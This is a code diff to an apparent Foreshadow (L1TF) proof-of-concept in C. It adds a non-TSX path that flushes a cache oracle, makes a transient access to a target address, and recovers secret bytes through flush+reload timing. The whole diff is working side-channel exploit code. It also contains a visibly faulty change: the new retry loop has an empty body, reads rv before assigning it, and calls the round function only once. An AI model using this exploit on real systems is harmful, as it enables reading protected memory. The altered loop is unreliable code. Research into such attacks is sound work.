@@ -30,6 +30,7 @@
 #include <sys/stat.h>
 #include <string.h>
 
+#define USE_TSX                     1
 #define SLOT_SIZE			        0x1000
 #define NUM_SLOTS			        256
 #define ORACLE_SIZE                 (SLOT_SIZE * NUM_SLOTS)
@@ -58,6 +59,7 @@ static inline int __attribute__((always_inline)) foreshadow_round(void *adrs)
     void *slot_ptr;
     int i, fault_fired = 0;
 
+    #if USE_TSX
     /*
      *  NOTE: doing the speculative, secret-dependent access a single time and
      *  then flush+reloading all 256 oracle entries at once seems to give
@@ -81,6 +83,20 @@ static inline int __attribute__((always_inline)) foreshadow_round(void *adrs)
         if (reload( slot_ptr ) < fs_reload_threshold)
             return i;
     }
+    #else
+    for (i=0; i < NUM_SLOTS; i++)
+        flush( SLOT_OFFSET( fs_oracle, i ) );
+
+    /*
+     * NOTE: proof-of-concept only: calling application should catch exception
+     * and properly restore access rights.
+     */
+    transient_access(fs_oracle, adrs, SLOT_SIZE);
+
+    for (i=0; i < NUM_SLOTS; i++)
+        if (reload( SLOT_OFFSET( fs_oracle, i ) ) < fs_reload_threshold)
+            return i;
+    #endif
 
     return 0;
 }
@@ -93,8 +109,8 @@ int foreshadow(void *adrs)
         foreshadow_init();
 
     /* Be sceptic about 0x00 bytes to compensate for the bias */
-    for(j=0; !(rv = foreshadow_round(adrs)) &&
-             j < FORESHADOW_ZERO_RETRIES; j++, fs_zero_retries++);
+    for(j=0; (rv==0x00 || rv==0xff) && j < FORESHADOW_ZERO_RETRIES; j++, fs_zero_retries++);
+        rv = foreshadow_round(adrs);
 
     return rv;
 }
